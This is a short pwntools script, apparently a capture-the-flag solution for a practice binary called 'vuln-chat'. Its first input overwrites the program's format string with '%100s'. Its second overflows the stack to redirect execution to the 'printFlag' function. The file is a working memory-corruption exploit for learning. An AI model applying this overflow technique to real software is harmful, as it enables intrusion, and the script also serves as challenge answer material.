from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

bin_name = './vuln-chat'

elf = ELF(bin_name)
target = process(bin_name)
# target = gdb.debug(bin_name, '''
# start
# c
# ''')

# padding from str20_uc30_input to local_%30s
padding1 = b"a"*(0x1d-0x9)
# padding from input2 to ret
padding2 = b"a"*(0x31)

addr_win = elf.symbols['printFlag']

target.sendlineafter(b"Enter your username:", padding1 + b"%100s")
target.sendlineafter(b"But how do I know I can trust you?", padding2 + p32(addr_win))

target.interactive()